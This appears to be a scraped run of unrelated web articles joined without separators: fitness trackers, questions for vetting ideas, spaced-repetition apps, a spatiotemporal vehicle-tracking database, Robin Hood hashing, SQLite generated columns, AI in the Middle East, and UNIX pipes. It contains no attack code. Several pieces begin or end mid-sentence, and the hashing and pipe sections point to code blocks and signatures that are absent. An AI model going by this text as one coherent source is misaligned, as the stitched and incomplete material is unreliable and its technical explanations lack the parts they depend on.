specific to Ruby and can be used in any language that uses IEEE 754 floating-point numbers.</p>  </div> </article> </div></div>]]>

This is understandable but surely there must be a reason so many people have invested in smart trackers other than our obsession with wearable tech?</span></p><p id="viewer-rnti"><span>
The point is that these devices will work, for <strong>some people. </strong>That is to say that too many people go and buy these devices hoping they'll motivate them to move more, but this just isn't the case; consumers misperceive what are in fact data trackers as motivational tools.</span></p><blockquote id="viewer-1dp63"><span>
“Fitness trackers are equivalent to a bathroom scale,” says Eric Finkelstein, lead author of the Lancet study. “They’re a measurement tool, not an intervention tool. They tell you something, but don’t give you a strategy for how to change it.”</span></blockquote><h3 id="viewer-4sqnd"><span><strong>Should you still go out and buy one?</strong></span></h3><p id="viewer-fnpda"><span>As I said before, the usefulness of these devices varies from person to person, if you think that receiving a bunch of data about how much you’re moving on a regular basis will motivate to stay active then sure!

<p>New ideas are always exciting. We get hands-on and start building too early, only to lose interest later.</p>



<p>Here is a list of questions I currently use to reflect on ideas before I build them.</p>



<p><strong>Who am I building for?</strong></p>



<ul><li>Where can I find them?</li><li>Do I have easy access to where they are?</li><li>Can I describe the my potential users in a short sentence?</li></ul>



<p><strong>What problems do they have today?</strong></p>



<ul><li>Can I explain the problem in simple words?</li></ul>



<p><strong>What is my solution?</strong></p>



<ul><li>What do I have to build?</li><li>Is it technically feasible and possible?</li></ul>



<p><strong>What is the current state?</strong></p>



<ul><li>How do people solve it today?</li><li>Who are the competitors? What is wrong with them?</li><li>Is my solution so much better to make them try it?</li><li>Have someone else tried this before?</li><li>What are the reasons for people to not use this? Can I solve this?</li></ul>



<p><strong>Why now?</strong></p>



<ul><li>Why is now the best time to do this?</li><li>Why haven’t anyone thought of this before?</li></ul>



<p><strong>Is this for me?</strong></p>



<ul><li>What is my unfair advantage?</li><li>Is this something I want to do for next 10 years of my life?</li><li>Does it align with my personal vision?</li></ul>



<p>Answering all that question might take a lot of time. But thinking about these things will give you more time to reflect on the idea and decide if it is worth pursuing.</p>

    <p>As many of us have experienced during school years, late-night learning is not the most effective technique. The information might have stuck around for a short period, but just after the day of the exam, it flew away with us unable to recall it. If you would like to remember more during and after your studies, forget the last-minute learning. Using spaced repetition, a method to rehearse educational material, you will not simply earn better grades, but studying would be an overall easier process and memorized information will be available to recall later in your life.</p>

<p>The spaced repetition system is a learning technique in which the material previously learned is recalled by the learner from time to time at ever-increasing intervals. This method is based on the intermittent repetition effect on how we tend to forget information. The primary goal of the technique is to recall the material learned as infrequently as possible, just before we forget it. By approaching repetitions in this scientific way, time spent learning can be used much more efficiently.</p>
<h2>The neurological background of memorizing</h2>
<p>Learning always begins with perception, the form of how we collect information. This data travels through the nerve pathways to the place where the perception is processed, our brain. Some perceptions cause our bodies to react, which usually does not happen consciously.</p>
<p>Scientists once thought that the brain stores memories in a similar way to computers. It was later proved that the artificial approach is completely different: information is broken down into elements (bits) on the computer and is stored that way. The machines can store up to a certain amount of information on a storage device called a hard disk. If our brain would work similarly, despite having hundreds of billions of cells, our internal storage device would have filled up in a matter of hours.</p>
<p>Our brains work in a rather different way: since we always store information in context it is more about capturing the contents of things. That’s why when we recall a memory, related reminiscences come to mind, like smells or the color of the paper, or what we ate for dinner during learning.</p>
<h2>What makes spaced repetition so effective?</h2>
<p>Spaced repetition technique is one of the most effective learning techniques, which you probably use even if you do not know about it. Using this method consciously makes it far superior to standard learning.</p>
<p>There are three key values it provides:</p>
<div>
<p>Delays forgetting learned information by prolonging the forget-curve.</p>
<p>Active recall helps to keep memorized information fresh (as the context layers build-up, it gets easier to remember what you have learned).</p>
<p>Spaced repetition supports long term memory, so you won’t forget the learned information even after the exam.</p>
</div>
<h2>How to get started with the spaced repetition system?</h2>
<p>To put the above in practice, try to remember a movie you’ve seen more than one time. After you’ve watched it first, you understood it well, but a few weeks later you only remembered the title and main story points. You watched it with a friend two months later, and while watching, you have realized that you can recall the story and started to watch out for certain details in the background, or the listening closer to the music. When you watched it for the third time, you probably remembered all the names, a few exact quotes, and the story details too.</p>
<p>Of course, the typical study materials are far from a movie’s excitement, however, learning it works the same. Review your documents and memorize them for the first time. After you have finished, try recalling them in a suitable way: you can write them down or simply rehearse the answers out loud. (Trying to recall it through your inner voice is not the best idea as we all tend to cheat ourselves.)</p>
<p>If you recalled it correctly, put the documents down and start another activity. After an hour try to rehearse it again, maybe using a different method. Then again in a few hours, and on the next day morning. Keep lengthening these intervals until you are ready to face the exam.</p>
<h2>Applications and websites that support you along the journey</h2>
<p>Luckily, today we have multiple choices on how to organize our studies. Different websites, along with applications, will help to study faster and also memorize for the long-term. Let’s see 5 software programs and applications utilizing the spaced repetition system!</p>
<h3>1. <a href="https://quizlet.com/" target="_blank" rel="noopener noreferrer">Quizlet</a></h3>
<p><picture><source type="image/webp" srcset="https://productive.fish/blog/spaced-repetition/Quizlet-logo.webp"><img src="https://productive.fish/blog/spaced-repetition/Quizlet-logo.png" alt="Quizlet logo"></picture> <strong>Platforms:</strong> iOS, Android, web</p>
<p><strong>The basic idea:</strong> This is an application that you can use either through your browser or on any mobile device. With one account you can have all your data synchronized, so you can continue your studies away from the computer when it is time to repeat!</p>
<p>The basic idea of Quizlet is that you can search for subjects that already have their case sets and use those, or you can create your own “memorizing cards”. Just enter the term and the definition, and after you are ready, you can start the learning process. Quizlet is also utilized for high-level education and corporate usage, ranging from healthcare studies to Starbucks training programs.</p>
<p>The app is available for students and teachers as well. If you get the vibe of this tool and you want to support it, for a low amount of monthly payment you can also purchase Quizlet Go or Plus for wider and advanced toolkits to create enhanced study sets.</p>
<p><strong>How it fits with SRLT:</strong> After creating or choosing your flashcard set, you can start to memorize the information. When you feel ready, you can choose how to check your knowledge. First is the “Learning” phase: Quizlet will show you the term and you will have to answer it from multiple choices or you will have to type it from memory - and the software will immediately review it. Getting it correctly will set the term as “Familiar”, and after multiple times it will be changed to “Mastered”. Furthermore, this spaced repetition app will give you constant feedback based on your answers, where you are in the learning process, and what you should focus on.</p>
<h3>2. <a href="https://www.edapp.com/" target="_blank" rel="noopener noreferrer">EdApp</a></h3>
<p><picture><source type="image/webp" srcset="https://productive.fish/blog/spaced-repetition/EdApp-logo.webp"><img src="https://productive.fish/blog/spaced-repetition/EdApp-logo.png" alt="EdApp logo"></picture> <strong>Platforms:</strong> iOS, Android, web</p>
<p><strong>The basic idea:</strong> Signing up for EdApp will give you a choice if you want to educate others or yourself. The registration is fast, and you can immediately create your topic or search in the content library based on your interest.</p>
<p>The contents will be summarized using texts, gifs, and short videos because visualization had a great positive effect on memorizing capabilities. The presentations also have interactive parts, triggering the mind with the element of surprise, stabilizing the learned information. While you are stepping further, EdApp will give you milestones to know where you are in the process.</p>
<p><strong>How it fits with SRLT:</strong> With its sophisticated approach and triggering effects, this spaced repetition software helps to improve memorizing information. On its finalizing page it summarizes the studied content, and based on your answers it gives feedback.</p>
<h3>3. <a href="https://apps.ankiweb.net/" target="_blank" rel="noopener noreferrer">Anki</a></h3>
<p><picture><source type="image/webp" srcset="https://productive.fish/blog/spaced-repetition/Anki-logo.webp"><img src="https://productive.fish/blog/spaced-repetition/Anki-logo.png" alt="Anki logo"></picture> <strong>Platforms:</strong> Windows, Mac, Linux, iOS, Android, and any device with a web browser</p>
<p><strong>The basic idea:</strong> Anki is a simple, ad-free software that helps you to create flashcards. After downloading it to your computer or on your mobile phone, the first step is to generate decks, which will include flashcards. All cards have a front- and a backside that you can fill up with information. Also, you can insert pictures and other notes from your classes, so you can memorize those as well. You can also grade the difficulty of the lesson. Anki is mostly used by college students (especially in healthcare). It runs offline, and its ad-free, transparent user interface won’t cause any disturbance during studying.</p>
<p><strong>How it fits with SRLT:</strong> Based on how difficult you have found the lecture, the program will offer you three choices to choose from: to see the lesson again in one minute or to repeat it in ten minutes or four days.</p>
<h3>4. <a href="https://www.brainscape.com/" target="_blank" rel="noopener noreferrer">Brainscape</a></h3>
<p><picture><source type="image/webp" srcset="https://productive.fish/blog/spaced-repetition/Brainscape-logo.webp"><img src="https://productive.fish/blog/spaced-repetition/Brainscape-logo.png" alt="Brainscape logo"></picture> <strong>Platforms:</strong> web, Android, iOS</p>
<p><strong>The basic idea:</strong> Brainscape is a specialized spaced repetition system where the algorithm focuses on the areas which need improvements, based on your answers and learning patterns. This is a lively web surface because their team is openly active on other social media websites and showing their results and feedback from users and companies, furthermore, a blog, full of content, is available as well.</p>
<p><strong>How it fits with SRLT:</strong> Brainscape will effectively monitor and check your answers and will support you - if you are honest how well you have known the flash cards’ answers, based on a scale from 1 to 5. It will also measure time during your study phases and help you to memorize information faster.</p>
<h3>5. <a href="http://smartcardsplus.com/" target="_blank" rel="noopener noreferrer">SmartCards+</a></h3>
<p><picture><source type="image/webp" srcset="https://productive.fish/blog/spaced-repetition/SmartCards-logo.webp"><img src="https://productive.fish/blog/spaced-repetition/SmartCards-logo.png" alt="SmartCards+ logo"></picture> <strong>Platform:</strong> iOS</p>
<p><strong>The basic idea:</strong> Smartcards will support your studies with a learning curve, measure the optimal time, and suggest when to repeat your studies. This spaced repetition app is only available for iOS users.</p>
<p><strong>How it fits with SRLT:</strong> Its classical surface will help you not simply with drag and drop text flashcards, but you can also insert video and audio files to support the memorization process. Furthermore, typing an answer is also an option during the learning phase, and the program will color results to show if you were correct or not.</p>
<h2>Conclusion</h2>
<p>Learning accompanies us throughout our entire life, while as we age studying gets harder. Spaced repetition is a good-to-know tactic (or even life-hack) that you might have used before without consciously knowing it. Utilizing the method through one of the above spaced repetition software apps will help you to memorize learning materials more effectively and in less time. The method comes handy in all ages, regardless if you go to school, prepare for college exams, or do corporate training to develop your career.</p>

<p><span>"Storing and querying datasets that contain objects in a geometric space have always required special treatment. The choice of data structures and query algorithms can easily make the difference between a query that runs in seconds or in days.“</span> (Werner Vogels, Amazon CTO, <a href="https://www.allthingsdistributed.com/2013/08/spatial-databases.html" target="_blank" rel="noopener">https://www.allthingsdistributed.com/2013/08/spatial-databases.html</a>)</p>
<p>Mireo has been in the vehicle tracking business since 2001 and during that time we have learned many valuable lessons. One of the most important ones is that these systems usually don't scale. What does this mean? As the number of records exceeds a few billion mark, the processing of data requires exponentially more time. This is true for all systems processing data produced by moving objects, but which are not designed as natively horizontally scalable.</p>
<p>In the late summer of 2014, we got an interesting and challenging business proposal –&nbsp; to design and develop a system capable of live tracking 2 million trucks and storing their log history for a period of 5 years. Can you imagine the amount of spatiotemporal data we would need to store and process? In order to correctly perform the map-matching process (i.e. detect the road where the vehicle is currently located, based on its imprecise GPS position), a vehicle needs to send its GPS positions relatively frequently. For the sake of simplicity, let's approximate this with ”1 position every 3 seconds“ while a vehicle is driving. Now, let's do the math:</p>
<p>2.000.000 vehicles</p>
<p>x 1.200 GPS positions per vehicle per hour</p>
<p>x 5 years</p>
<p>= 105.120.000.000.000 positions</p>
<p>Yes, that's more than <strong>105 trillion</strong>. Needless to say, our old vehicle tracking system that relies on the combination of relational and NoSQL databases would fall apart under such amount of data. Additionally, the new system was required to be able to resolve queries such as ”<em><strong>fetch the total number of truck visits to the specified factory“.</strong></em></p>
<p>There were several difficult problems to be solved in order to fulfill this kind of business proposal, such as load distribution, map-matching, networking (tracking 2 million vehicles means 2 million permanently open TCP connections). However, the most difficult one was definitely choosing the right storage. Where should we store the data? To a file system? To a relational database? To a NoSQL database? To a general-purpose object storage like Hadoop? Each of the mentioned options presented problems of its own: traditional relational SQL databases are not designed as distributed and horizontally scalable, NoSQL key-value databases have records with the same index dispersed around the disk (performance killer!), with clustered file systems (Ceph, GlusterFS, HDFS..) it is not possible to use maximal disk bandwidth with the level of abstraction which those file systems bring, etc.</p>
<p>The storing of data needed to be efficient, but the most important was to provide <strong>fast searching.</strong> For example, the execution time of the query <em><strong>”fetch all positions and timestamps when specified 4 trucks met each other“</strong></em> could not exceed few seconds in the worst case scenario. Additionally, we wanted to have the possibility to make OLAP-like queries, grouping, joining... In other words, some special kind of relational-like database would be the best choice. But which one? We had to do some serious brainstorming.</p>
<ul>
<li>we needed a relational-like database with an excellent spatiotemporal index and appropriate query language</li>
<li>we needed to store <strong>n-dimensional</strong> data sets – how would one sort such data?</li>
<li>distribution of data from ”real world“ was highly non-uniform – we would get a lot of data from the crowded areas with many vehicles, and a small amount of data from rural areas</li>
</ul>
<p>A mantra in the software engineering world is ”don't reinvent the wheel“. Naturally, we started to analyze current state-of-the-art solutions for processing massive spatiotemporal data. Besides the other obvious properties of such a system, we quickly figured out that the most critical part was the way in which the system would index multidimensional data. It turned out that there were three major multidimensional index types used in major spatial systems: R-tree family of trees (PostgreSQL/PostGIS, Oracle Spatial, MemSQL, ...), kd-tree family (Oracle Spatial Quad tree index) and Geohash (GeoMesa and various variants of products found on Google Cloud). Guess what? None of these solutions is suitable for indexing a huge amount of real-world spatiotemporal data! Let's see why.</p>
<p>Due to the aforementioned non-uniform data distribution, R-tree family of indexes is practically useless on a large scale because index traversal over high-density areas effectively becomes linear. A similar, but much worse effect would happen with fixed-grid space/time partition indexes like Geohash. The index traversal on high-density areas with Geohash would again become very linear with no possibility for more granular partitioning. To make things worse, Geohash-based indexes could in theory yield good record filtering only if range queries are finitely bounded by all dimensions. For example, in the context of a vehicle tracking system, it is natural to store and index triplets having vehicle ID, timestamp and location. Then, trying to execute a simple query of the form <em><strong>“fetch full history for one single vehicle for the period of one year“</strong></em> using Geohash would effectively linearly scan the complete database because the query is bounded by vehicle ID and timestamp, but not by location!</p>
<p>kd-tree family of indexes are the most efficient type of indexing n-dimensional interval data, but with one huge drawback – they are built on the top of static data sets. It would be possible to efficiently index even a large interval data set using kd-tree type of index, but only if the underlying recordset would not change afterwards. There had been attempts in scientific literature to loosen this requirement, but to the best of our knowledge, there was no commercially available system using some of those approaches. In our scenario, new data would keep arriving all the time so static data sets were not an option.</p>
<p>To wrap up, the system capable of storing and analyzing a large amount of spatiotemporal real-time data had to contain at least the following:</p>
<ol>
<li>it had to be designed from the ground up as <strong>clustered, distributed system</strong> with data processing modules deployed as close as possible to the physical data storage (in other words, traditional RDMBS are useless for this purpose)</li>
<li>it had to be <strong>highly available, fault-tolerant and natively horizontally scalable</strong></li>
<li><strong>the index on spatiotemporal records was by far the most important ingredient of an efficient spatiotemporal database processing system;</strong> as we saw, none of the current state-of-the-art spatiotemporal indexes was suitable for dealing with a large amount of records coming from moving objects</li>
<li><strong>partitioning scheme had to exploit spatiotemporal properties of the underlying data</strong> - records that are close (based on vehicle ID, position and timestamp) needed to be in the same or adjacent shards</li>
</ol>
<p>We had to come up with something new, something absurdly fast and massively scalable. After 5 years of hard work by the group of extremely talented people, we are proud to present <strong><a href="https://www.mireo.hr/spacetime">Mireo SpaceTime Cluster</a></strong>.

<p>There’s a neat variation on open-addressing based hash tables called <a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;frm=1&amp;source=web&amp;cd=1&amp;cad=rja&amp;sqi=2&amp;ved=0CDAQFjAA&amp;url=https%3A%2F%2Fcs.uwaterloo.ca%2Fresearch%2Ftr%2F1986%2FCS-86-14.pdf&amp;ei=RJqJUcHZH8HuigKGsoHQDw&amp;usg=AFQjCNEyXJn73zNas94y_yK55dv--oMmbg&amp;sig2=CRV_bivIwvFsw8c2wz5ZwQ&amp;bvm=bv.46226182,d.cGE">Robin Hood hashing</a>. This technique isn’t very well-known, but it makes a huge practical difference because it both improves performance and space utilization compared to other “standard” hash tables (e.g. <a href="http://en.wikipedia.org/wiki/Hash_table">chaining</a>). It also eliminates the major downside of other open addressing hash tables.</p>

<p>Here are the benefits, summarized:</p>

<ul>
<li><p>High load factors can be used without seriously affecting performance. 0.9 is perfectly reasonable as a default (0.95 or higher works too, it mainly affects insertion cost a bit).</p></li>

<li><p>No linked lists or other extra pointers. This reduces cache misses and storage overhead. Your underlying structure can be a simple flat array since it’s just open addressing under the hood.</p></li>

<li><p>Lookup and insertion logic is fast. Again, no linked lists to traverse or other complications, just a linear probe sequence with a few checks per element.</p></li>

<li><p>Unlike other open addressing schemes, looking for non-existent elements is still fast.</p></li>
</ul>

<p>For a simple benchmark where I inserted 100k english words into a map, then deleted 10% of them, and then looked them all up again, the timings for my simple Robin Hood hash table was <strong>23%</strong>, <strong>66%</strong> and **25% **lower for insertions, deletions and lookups respectively compared to the VS 2012 std::unordered_map, it did this using <strong>30%</strong> less memory overall.</p>

<h2 id="it-s-all-about-the-variance">It’s all about the variance</h2>

<p>So the basic idea is to take normal open addressing, but use one clever trick in order to drastically reduce the variance of the expected average and maximum probe lengths. We’ll se later why reducing variance is so important. To give you an idea how Robin Hood Hashing improves things, the probe length variance for a RH table at a load factor of 0.9 is 0.98, whereas for a normal open addressing scheme it’s 16.2. At a load factor of 0.99 it’s 1.87 and 194 respectively.</p>

<p><strong>The clever trick is just this</strong>: when you probe for a position to insert a new element, if the probe length for the existing element is less than the current probe length for the element being inserted, swap the two elements and keep going.</p>

<p>That way elements that were inserted early and thus “lucked out” on their probe lengths, will gradually be moved away from their preferred slot as new elements come in that could make better use of that place in the table (hence the name - the insertion “takes from the rich”, i.e. the elements with low probe counts). It leads to an “evening out” of the probe lengths.</p>

<p>Why is low variance better? Well, with modern cache architectures a probe count of 1 isn’t really much faster than a probe count of 3, because the main cost is fetching the cache line, so the ideal scenario is for all elements to have the same probe count, and having that probe count fitting within one cache line.</p>

<p>It turns out that Robin Hood hashing has the same expected probe count as normal open addressing (about 2.55) - it just has substantially less variance, and therefore ends up with far fewer cache misses. Yes, there are fewer elements that can early out after 1 probe, but there also far fewer elements that end up needing to fetch multiple cache lines because of long probe lengths.</p>

<p>Furthermore, the expected value of the <em>longest</em> probe sequence approaches about 6 for a load of 0.9 (it’s not actually constant, but grows very, very slowly - <a href="http://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;frm=1&amp;source=web&amp;cd=2&amp;cad=rja&amp;sqi=2&amp;ved=0CDcQFjAB&amp;url=http%3A%2F%2Fciteseerx.ist.psu.edu%2Fviewdoc%2Fsummary%3Fdoi%3D10.1.1.130.6339&amp;ei=RJqJUcHZH8HuigKGsoHQDw&amp;usg=AFQjCNFquQO-Wa7uCGLwFTdLKpEHDBGsig&amp;sig2=DfIIJzRj2YXIRyLiHGCHUA&amp;bvm=bv.46226182,d.cGE">see this paper</a>), which is pretty reasonable.</p>

<h2 id="what-about-failed-lookups">What about failed lookups?</h2>

<p>So now you’re probably thinking that this sounds good, but in the back of your mind you know that normal open addressing tables do pretty well too, but have a major downside in that searching for non-existing elements is troublesome to handle. To allay your fears I’ll first tell you a very simple (but totally practical) solution that is enabled by the low variance, and then we’ll see the even better version later.</p>

<p>First a recap. The usual problem is this: since the search algorithm terminates when you find an “empty” slot in the underlying array, it can take a very long time to determine that an element doesn’t exist in the array when the table grows full.</p>

<p>How does Robin Hood hashing solve this? Well the simplest solution is to exploit the fact that the expected longest probe count is low (~6). Just modify the standard search algorithm to ignore empty slots (rather than terminate the search) and keep going until you’ve probed longer than the known maximum probe length for the whole table. This maximum probe length will be small, with a very high probability, even for very loaded tables.</p>

<p>This solution would obviously be inefficient for the standard open addressing scheme, since the expected longest probe count is much higher (e.g. at a load of 0.9 and ~64K elems it&nbsp;is about 70).</p>

<h2 id="the-details">The details</h2>

<p>In order to know what the probe count of an existing element is (which is key to the algorithm) we could just re-hash the element to re-compute its “desired” slot index and then subtract this from its actual location. A faster way is to simply cache the hash value for each key.</p>

<p>Storing the hash value is generally a sensible strategy anyway, because it means you have a fast early-out for comparisons, so we take that approach here. In other words, the hash table elements consist of a 32 bit hash value, the key, and the value. For my implementation I stored the hash values in a separate array in order to get more hash probes per cache line (at the expense of a second mandatory cache miss to actually fetch the key). This gave a small speed-up for my test where the key size was large (sizeof(std::string)), but there’s a #define in the code to put the hash value alongside its key.</p>

<p>In order to indicate that a slot is unused, we modify the hash function to never return 0, and use a stored hash value of 0 to mean “uninitialized slot”.</p>

<p>First, let’s look at the insertion algorithm, since this is where the actual Robin Hood trick comes in.</p>

<p>The algorithm is pretty simple. We simply loop until we’ve found an uninitialized slot (hash value == 0). If we found an existing slot whose probe distance is less than our current probe count (‘dist’), we swap places and continue.
Note: using move semantics here matters (e.g. for efficient swapping).</p>

<p>In order to delete an element, we follow the same strategy as for normal open addressing and mark the slot as a tombstone. Tombstones are treated specially in the insert algorithm. We overwrite the tombstone only when we would’ve wanted to swap anyway (see the check for is_deleted above).</p>

<p>We must mark&nbsp;the tombstone&nbsp;using a whole bit rather than just reserving a single hash value (like we did for uninitialized slots), because we need to know the probe count of the tombstone.</p>

<p>This just finds the desired position of the element using the hash, then probes linearly from there on in. There are two conditions to signify that the element doesn’t exist, and finally one check to see if we’ve found the element.</p>

<p>The first exit condition checks for completely uninitialized elements. This is because if the element we are looking for had probed an uninitialized slot during insertion, it would have simply been place there. So the existence of an uninitialized slot along our probe sequence means the element must not be in the table.</p>

<p>The second condition is more interesting. This is our replacement for simple checking the probe distance against a table-wide maximum probe count. We <em>know</em> that when we probe an element during insertion, the one with the longer probe count of the two gets to keep the slot. So if we’re looking for an element that exists,&nbsp;we should expect to never see an existing element with a shorter probe count then our current count (if that <em>had</em> happened, there would’ve been a swap during insertion!).</p>

<p>In other words, we early out as soon as our current probe count exceeds the probe count of the stored element. Since the average probe count for stored elements is 2.55, we can exit pretty quickly for non-existent elements (much earlier than stopping after a table-wide maximum probe count).</p>

<p>This second condition is why we need to maintain the hash value even for tomb stones. Imagine what would happen if we simply marked the slot as uninitialized when it was …</p></section></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>



<p>SQLite has had JSON support for a while.</p>

<p>However recently it added a killer feature: <a href="https://www.sqlite.org/gencol.html">generated
columns</a>. (This was added in 3.31.0,
released 2020-01-22.)</p>

<p>This makes it possible to insert JSON straight into SQLite and then have it
extract data and index them, i.e. you can treat SQLite as a document database.
This has been possible with PostgreSQL and obviously is what something like
Elastic provides but having it available in an embedded database is very nice
for lightweight stuff.</p>

<p>Let's get started:</p>

<pre><code>$ sqlite3
SQLite version 3.31.1 2020-01-27 19:55:54
Connected to a transient in-memory database.
sqlite&gt; CREATE TABLE t (
   body TEXT,
   d INT GENERATED ALWAYS AS (json_extract(body, '$.d')) VIRTUAL);
sqlite&gt; insert into t values(json('{"d":"42"}'));
sqlite&gt; select * from t WHERE d = 42;
{"d":"42"}|42
</code></pre>

<p>It's that simple, the <code>d</code> column is extracted from the provided JSON.</p>

<p>(Aside: The hard bit may be getting a new enough SQLite, at the time of writing
Homebrew on macOS has it, else you likely need to use an unstable source like
nixpkgs-unstable.)</p>

<p>There's some nice properties of this. Normally it's encouraged to minifiy and
validate JSON when inserting (via the <code>json()</code> function) as because SQLite
doesn't have a JSON type it will allow anything. However nothing enforces that,
you could add a constraint but will probably forget... Having <code>GENERATED ALWAYS</code>
using <code>json_extract</code> means invalid JSON will get a <code>Error: malformed JSON</code> at
INSERT time.</p>

<p>This can be taken further:</p>

<pre><code>sqlite&gt; CREATE TABLE x (
  body TEXT,
  id TEXT GENERATED ALWAYS AS (json_extract(body, '$.id')) VIRTUAL NOT NULL);
sqlite&gt; insert into x values('');
Error: malformed JSON
sqlite&gt; insert into x values('{}');
Error: NOT NULL constraint failed: x.id
</code></pre>

<p>We can enforce items are present in the inserted JSON, here by adding <code>NOT
NULL</code>, but we could also use constraints and other SQLite features!</p>

<p>You'll notice I've used <code>VIRTUAL</code> with the generated column in these examples.
There's also the option of using <code>STORED</code> to essentially cache the values,
although a downside is you can't add those columns via <code>ALTER TABLE</code>.</p>

<p>However you can always create an index on a column, even if it's defined a
virtual one:</p>

<pre><code>CREATE INDEX xid on x(id);</code></pre>

<p>Then check that's going to work as expected:
</p><pre><code>EXPLAIN QUERY PLAN SELECT * FROM x WHERE id='foo';
QUERY PLAN
`--SEARCH TABLE x USING INDEX xid (id=?)
</code></pre>

<p>Combined with ALTER TABLE we can add a new column and index it:</p>

<pre><code>ALTER TABLE x ADD COLUMN text TEXT
    GENERATED ALWAYS AS (json_extract(body, '$.text')) VIRTUAL;
INSERT INTO x VALUES(json('{"id":43, "text":"test"}'));
CREATE INDEX xtext ON x(text);
</code></pre>

<p>
The benefit here is you can start off with a table which could be as simple as
just a single JSON column, and add columns and indexes as you find useful data
in that JSON. For example this can work really well for webhooks, insert all the
data you are sent straight into a table, then pull out the useful stuff later.
Have fun.

<p>Middle east is one of the top tech destinations where artificial intelligence is playing a significant role. The region is known for its oil wells, which are major contributors to the region’s economy. Slowly the economy is shifting its base from petrochemicals to technology. The region is slowly shifting its economic dependence on oil wells. According to an IDC report, spending on AI in the region is expected to grow at an annual growth of 19%.&nbsp;Consequently, demand for <strong><a href="https://www.artiba.org/the-artiba-edge" data-wpel-link="external" rel="external noopener noreferrer">AI professionals and engineers</a></strong> is expected to increase further.&nbsp;&nbsp;</p>



<p>The growth of AI in the region has been significant. AI can be seen being used across a range of verticals in the region, including consumer, enterprise, and government activities. One of the major significant impacts of artificial intelligence can be seen in the development of smart cities in the region. Banking and retail are seeing equally strong contribution of AI. According to IDC, these sectors will account for more than 33% of investments by 2020. The federal and central government and telecommunication industry will witness significant investment in AI.&nbsp; &nbsp;</p>



<div><p>South Africa, the largest AI market in the Middle East and Africa, will contribute around 30% of total AI spending that would come from the automated customer service agents, IT automation, and automated threat intelligence and prevention systems, according to Manish Ranjan, IDC’s program manager for software and cloud in the Middle East, Africa, and Turkey.</p></div>



<p><strong>Pushing the AI sector in the region&nbsp;</strong></p>



<p>Not just South Africa, many other countries are investing heavily in AI intending to shift their economy away from a dependency on petrochemicals. Saudi Arabia is expected to accrue the largest gains where AI is expected to contribute over $135.2bn in 2030 to the economy, roughly equivalent to 12.4% of GDP. UAE is expected to see the largest impact close to 14% of 2030 GDP, according to PwC. The company cites the levels of investment in AI in the two countries in comparison to other regions, as the rationale behind its judgment.&nbsp;&nbsp;</p>



<p>The formation of a new authority and center for AI in Saudi Arabia, the launch of UAE AI strategy in October 2017, and the establishment of the Mohamed bin Zayed University of Artificial Intelligence are a few initiatives that PwC cites for its predictions.&nbsp;Increasing supply of AI talent by educating more <strong>AI professionals</strong> is a top strategic priority in the region.</p>



<p><strong>Paving way for the AI development&nbsp;&nbsp;</strong></p>



<div><p>&nbsp;Business leaders in the middle east are keen to adopt AI solutions. Considering these many organizations have rolled out AI-based applications with the belief that if they don’t adopt AI now, it might cost their organization for the next decade.&nbsp;</p></div>



<p>The answer, Gartner research vice president Arup Roy argues, is a lack of understanding of the technology, as well as knowing when and where there’s a business case for using AI.</p>



<p>&nbsp;Lack of knowledge related to AI is a fundamental concern among businesses. When and how to use the technology for a business case is another concern for businesses.&nbsp;</p>



<p>Not to mention, lack of&nbsp;<a href="https://www.artiba.org/blog/the-artificial-intelligence-engineer-career-roadmap-all-you-need-to-know" data-wpel-link="external" rel="external noopener noreferrer"><strong>AI Engineers</strong></a>, infrastructure, and regulatory issues, are key considerations as well as challenges around natural language processing in Arabic. Understanding the impact of automation on jobs and the potential of AI to support and inform decision making.</p>



<p>&nbsp;A combination of research, education, and policy efforts, therefore, is needed for the potential of AI in the Middle East to be realized. UAE’s AI Talent Hunt Program and 2018’s 1 Million Arab coders initiative are prime examples of the kind of initiatives the region needs. Luminaries like Dr. FatmahBaothman, the first woman in the Middle East to earn Ph.D. in modern artificial intelligence, will be required to inspire future generations.&nbsp;<br>&nbsp;</p>



<p>Additionally, the governments in the middle east will have to tackle “contentious and challenging issues including the ones that go beyond jobs and labor market skills” expresses Guy Borton, a fellow at the LSE Middle East Centre and adjunct professor at Vesalius College, Brussels.&nbsp;</p>

<p>A pipe is a first-in-first-out interprocess communication channel.
The pipe version as it is known today was invented by an American Computer Scientist
<a href="https://en.wikipedia.org/wiki/Douglas_McIlroy">Douglas McIlroy</a>
and incorporated into Version 3 AT&amp;T UNIX in 1973 by
<a href="https://en.wikipedia.org/wiki/Ken_Thompson">Ken Thompson</a>.</p>

<p>It was inspired by the observation that frequently the output of one application is
used as an input for another. This concept can be reused to connect a chain
of processes. This is frequently observed
in UNIX shell constructs that utilize the <code>|</code> operator.</p>

<div><pre><code data-lang="bash">$ find lib -name *.c | awk -F <span>'/'</span> <span>'{print $NF}'</span> | sort -u | tail
yp_maplist.c
yp_master.c
yp_match.c
yp_order.c
yperr_string.c
yplib.c
ypprot_err.c
yyerror.c
zdump.c
zic.c</code></pre></div>

<p>This can be illustrated as a sequence of processes and pipes connecting the programs.</p>

<p><img src="https://raw.githubusercontent.com/Moritz-Systems/moritz_staticDir/master/pipe-chain.svg" alt="pipe chain"></p>

<p>This concept of connecting the UNIX tools has been expanded to various native tools,
such as the troff formatting system, that are specifically designed to be used in pipelines.
The troff format and the associated toolkit are still used in the NetBSD Operating System.
The build rules, producing the <code>.ps</code> files (<a href="https://en.wikipedia.org/wiki/PostScript">PostScript</a>)
look like this one, for
the kernmalloc (the kernel allocator documentation) example:</p>

<h2 id="the-c-interface-for-pipes">The C interface for pipes</h2>

<p>The <a href="https://pubs.opengroup.org/onlinepubs/9699919799/functions/pipe.html">POSIX specification</a>
declares the <code>pipe</code> function with the following signature:</p>



<p>inside the <code>&lt;unistd.h&gt;</code> header.</p>

<p>The <code>pipe</code> function takes an array of two integers, and writes file descriptors
of the read and write end of the pipe into it upon successful return.
The <code>fildes[0]</code> file descriptor is opened for reading and <code>fildes[1]</code> for writing.
Some implementations of UNIX allow using the <code>fildes[0]</code> end for writing too and <code>fildes[1]</code> for reading
(the full duplex mode), but this behavior is unspecified by POSIX and it is only safe to assume that
they are unidirectional (half duplex mode).</p>

<p>The <code>pipe</code> call can fail and return <code>-1</code>, setting appropriate <code>errno</code>
if the process (<code>EMFILE</code>) or the system (<code>ENFILE</code>) expired the allowed number of
open file descriptors.</p>

